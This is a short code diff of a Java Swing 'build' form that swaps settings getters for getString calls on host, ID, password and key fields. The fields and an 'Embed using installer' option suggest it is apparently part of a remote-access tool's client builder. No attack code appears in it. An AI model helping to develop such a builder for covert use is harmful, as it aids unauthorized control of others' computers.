@@ -86,7 +86,7 @@ public class FrameBuildMinimal extends BaseFrame {
 
 		JLabel lblPort = new JLabel("Port:");
 
-		txtHost = new JTextField(Settings.getGlobal().get("bip"));
+		txtHost = new JTextField(Settings.getGlobal().getString("bip"));
 		txtHost.setColumns(10);
 
 		spPort = new JSpinner();
@@ -95,7 +95,7 @@ public class FrameBuildMinimal extends BaseFrame {
 		JLabel lblId = new JLabel("ID:");
 
 		txtId = new JTextField();
-		txtId.setText(Settings.getGlobal().get("bid"));
+		txtId.setText(Settings.getGlobal().getString("bid"));
 		txtId.setColumns(10);
 
 		chckbxEmbed = new JCheckBox("Embed using installer");
@@ -114,12 +114,12 @@ public class FrameBuildMinimal extends BaseFrame {
 
 		JLabel lblPass = new JLabel("Pass:");
 
-		txtPass = new JTextField(Settings.getGlobal().get("bpass"));
+		txtPass = new JTextField(Settings.getGlobal().getString("bpass"));
 		txtPass.setColumns(10);
 
 		JLabel lblKey = new JLabel("Key:");
 
-		txtKey = new JTextField(Settings.getGlobal().get("bkey").length() == Crypto.KEY_LENGTH ? Settings.getGlobal().get("bkey") : Util.randomString(Crypto.KEY_LENGTH));
+		txtKey = new JTextField(Settings.getGlobal().getString("bkey").length() == Crypto.KEY_LENGTH ? Settings.getGlobal().getString("bkey") : Util.randomString(Crypto.KEY_LENGTH));
 		txtKey.addKeyListener(new KeyAdapter() {
 			@Override
 			public void keyReleased(KeyEvent arg0) {
